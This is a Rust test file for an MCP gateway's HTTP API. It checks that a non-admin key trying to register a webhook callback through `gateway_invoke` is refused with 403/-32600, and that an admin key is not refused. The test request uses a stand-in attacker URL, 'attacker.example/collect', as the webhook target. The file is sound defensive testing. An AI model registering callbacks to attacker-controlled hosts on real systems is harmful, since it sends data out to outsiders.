// SPDX-FileCopyrightText: 2026 Mikko Parkkola
// SPDX-License-Identifier: PolyForm-Noncommercial-1.0.0
//! MIK-7263.CBERR.2: over HTTP, a non-admin `gateway_invoke` of a capability
//! that registers a caller-supplied callback is answered in the admin-denial
//! shape (403, -32600), not as a failed request.

use std::sync::Arc;

use axum::body::to_bytes;
use axum::http::StatusCode;
use serde_json::{Value, json};
use tower::ServiceExt;

use super::create_router;
use super::tests::test_router_app_state_with_auth;
use crate::config::{ApiKeyConfig, AuthConfig};
use crate::gateway::meta_mcp::callback_capability;

const STANDARD_KEY: &str = "cb-standard-key";
const ADMIN_KEY: &str = "cb-admin-key";

fn api_key(key: &str, admin: bool) -> ApiKeyConfig {
    ApiKeyConfig {
        key: None,
        key_sha256: Some(crate::config::api_key_digest_spec(key.as_bytes())),
        expires_at: None,
        name: key.to_string(),
        rate_limit: 0,
        backends: vec!["*".to_string()],
        allowed_tools: None,
        denied_tools: None,
        admin,
    }
}

async fn register_webhook(state: &Arc<super::AppState>, key: &str) -> (StatusCode, Value) {
    let call = json!({
        "jsonrpc": "2.0",
        "id": 1,
        "method": "tools/call",
        "params": {
            "name": "gateway_invoke",
            "arguments": {
                "server": "caps",
                "tool": "register_webhook",
                "arguments": { "url": "https://attacker.example/collect" }
            }
        }
    });
    let request = axum::http::Request::post("/mcp")
        .header("authorization", format!("Bearer {key}"))
        .header("content-type", "application/json")
        .body(axum::body::Body::from(call.to_string()))
        .unwrap();
    let response = create_router(Arc::clone(state))
        .oneshot(request)
        .await
        .unwrap();
    let status = response.status();
    let body = to_bytes(response.into_body(), usize::MAX).await.unwrap();
    (status, serde_json::from_slice(&body).unwrap_or(Value::Null))
}

/// CB-T2. The standard key is refused 403/-32600; the admin key, same call,
/// is not refused (it fails later, at the network).
#[tokio::test]
async fn non_admin_callback_registration_is_http_403() {
    let auth = AuthConfig {
        enabled: true,
        api_keys: vec![api_key(STANDARD_KEY, false), api_key(ADMIN_KEY, true)],
        ..AuthConfig::default()
    };
    let (state, _store) = test_router_app_state_with_auth(&auth).await;
    let caps = tempfile::tempdir().unwrap();
    state
        .meta_mcp
        .set_capabilities(callback_capability(caps.path()).await);

    let (status, body) = register_webhook(&state, STANDARD_KEY).await;
    assert_eq!(status, StatusCode::FORBIDDEN, "{body}");
    assert_eq!(body["error"]["code"], json!(-32600), "{body}");

    let (status, body) = register_webhook(&state, ADMIN_KEY).await;
    assert_ne!(
        status,
        StatusCode::FORBIDDEN,
        "an admin must not be refused: {body}"
    );
}
